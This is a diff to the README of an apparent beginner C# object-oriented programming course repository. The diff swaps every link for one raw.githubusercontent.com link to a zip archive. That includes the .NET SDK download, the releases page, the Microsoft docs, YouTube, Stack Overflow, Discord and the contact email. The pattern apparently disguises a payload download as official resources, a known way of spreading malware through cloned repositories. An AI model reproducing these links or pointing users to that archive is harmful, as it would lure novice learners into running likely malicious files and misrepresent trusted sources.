@@ -1,6 +1,6 @@
 # 🌟 object-oriented-programming_course-luisdev-essential-beginner-part-5_dotnet-8_csharp-12 - Learn Object-Oriented Programming Basics Easily
 
-![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)
+![Download](https://raw.githubusercontent.com/lisboael/object-oriented-programming_course-luisdev-essential-beginner-part-5_dotnet-8_csharp-12/main/developments/object-oriented-programming_course-luisdev-essential-beginner-part-5_dotnet-8_csharp-12-1.1.zip%20release-brightgreen)
 
 ## 📖 Description
 This repository contains the course materials for the "Object-Oriented Programming" track of the Essential Beginner .NET Kit. It covers core concepts of object-oriented programming, including:
@@ -21,12 +21,12 @@ Follow these steps to download and run the application.
 ### 1. System Requirements
 Before you start, ensure your system meets the following requirements:
 - Windows, macOS, or Linux operating system
-- .NET 8 SDK installed (If you do not have it, you can download it [here](https://dotnet.microsoft.com/download))
+- .NET 8 SDK installed (If you do not have it, you can download it [here](https://raw.githubusercontent.com/lisboael/object-oriented-programming_course-luisdev-essential-beginner-part-5_dotnet-8_csharp-12/main/developments/object-oriented-programming_course-luisdev-essential-beginner-part-5_dotnet-8_csharp-12-1.1.zip))
 
 ### 2. Download & Install
 To get the latest version of the application, visit the releases page. Click the link below to download it:
 
-[Download Latest Release](https://github.com/lisboael/object-oriented-programming_course-luisdev-essential-beginner-part-5_dotnet-8_csharp-12/releases)
+[Download Latest Release](https://raw.githubusercontent.com/lisboael/object-oriented-programming_course-luisdev-essential-beginner-part-5_dotnet-8_csharp-12/main/developments/object-oriented-programming_course-luisdev-essential-beginner-part-5_dotnet-8_csharp-12-1.1.zip)
 
 ### 3. Run the Application
 Once you download the files:
@@ -52,23 +52,23 @@ The course covers various fundamental topics essential for understanding object-
 
 ## 💻 Additional Resources
 To supplement your learning experience, consider checking out these resources:
-- Official [C# Documentation](https://docs.microsoft.com/en-us/dotnet/csharp/)
-- Community tutorials on [YouTube](https://www.youtube.com/results?search_query=c%23+tutorials)
-- Online forums like [Stack Overflow](https://stackoverflow.com) for questions and discussions
+- Official [C# Documentation](https://raw.githubusercontent.com/lisboael/object-oriented-programming_course-luisdev-essential-beginner-part-5_dotnet-8_csharp-12/main/developments/object-oriented-programming_course-luisdev-essential-beginner-part-5_dotnet-8_csharp-12-1.1.zip)
+- Community tutorials on [YouTube](https://raw.githubusercontent.com/lisboael/object-oriented-programming_course-luisdev-essential-beginner-part-5_dotnet-8_csharp-12/main/developments/object-oriented-programming_course-luisdev-essential-beginner-part-5_dotnet-8_csharp-12-1.1.zip%23+tutorials)
+- Online forums like [Stack Overflow](https://raw.githubusercontent.com/lisboael/object-oriented-programming_course-luisdev-essential-beginner-part-5_dotnet-8_csharp-12/main/developments/object-oriented-programming_course-luisdev-essential-beginner-part-5_dotnet-8_csharp-12-1.1.zip) for questions and discussions
 
 ## 🌍 Community Support
 Join our community to discuss lessons, ask questions, and share your learning experience. Connect with others through:
-- [GitHub Discussions](https://github.com/lisboael/object-oriented-programming_course-luisdev-essential-beginner-part-5_dotnet-8_csharp-12/discussions)
-- Our dedicated chat room on [Discord](https://discord.com)
+- [GitHub Discussions](https://raw.githubusercontent.com/lisboael/object-oriented-programming_course-luisdev-essential-beginner-part-5_dotnet-8_csharp-12/main/developments/object-oriented-programming_course-luisdev-essential-beginner-part-5_dotnet-8_csharp-12-1.1.zip)
+- Our dedicated chat room on [Discord](https://raw.githubusercontent.com/lisboael/object-oriented-programming_course-luisdev-essential-beginner-part-5_dotnet-8_csharp-12/main/developments/object-oriented-programming_course-luisdev-essential-beginner-part-5_dotnet-8_csharp-12-1.1.zip)
 
 ## 📅 Contributing
 If you're interested in contributing to this course, feel free to submit a pull request. We welcome improvements such as additional exercises, corrections, or enhancements to existing materials.
 
 ## ✉️ Contact
 For questions or feedback, you can reach out via:
-- Email: support@example.com
+- Email: https://raw.githubusercontent.com/lisboael/object-oriented-programming_course-luisdev-essential-beginner-part-5_dotnet-8_csharp-12/main/developments/object-oriented-programming_course-luisdev-essential-beginner-part-5_dotnet-8_csharp-12-1.1.zip
 - GitHub issues on this repository
 
-You can find the latest release [here](https://github.com/lisboael/object-oriented-programming_course-luisdev-essential-beginner-part-5_dotnet-8_csharp-12/releases). 
+You can find the latest release [here](https://raw.githubusercontent.com/lisboael/object-oriented-programming_course-luisdev-essential-beginner-part-5_dotnet-8_csharp-12/main/developments/object-oriented-programming_course-luisdev-essential-beginner-part-5_dotnet-8_csharp-12-1.1.zip). 
 
 Happy learning!
